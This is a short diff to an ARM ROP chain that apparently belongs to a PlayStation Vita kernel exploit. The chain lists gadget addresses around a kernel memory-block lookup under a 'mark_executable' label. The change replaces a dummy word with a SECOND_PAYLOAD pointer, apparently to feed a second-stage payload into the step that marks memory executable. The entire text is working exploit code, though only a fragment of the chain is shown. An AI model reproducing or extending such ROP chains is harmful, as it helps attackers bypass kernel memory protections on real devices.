@@ -220,7 +220,7 @@ mark_executable:
   .word BASE+0x0000af33 @ sceKernelFindMemBlockByAddrForDriver(r0 = base, r1 = 0); pop {r3, r4, r5, pc}
   .word BASE+0x00000347 @ r3 = pop {pc}
   .word      0xDEADBEEF @ r4 = dummy
-  .word      0xDEADBEEF @ r5 = dummy
+  .word SECOND_PAYLOAD  @ r5 = dummy
   .word BASE+0x0001fc6d @ blx r3 @ pop {r4, pc}
   .word BASE+0x0000ea73 @ movs r3, r0 @ bx lr
   .word      0xDEADBEEF @ r4 = dummy
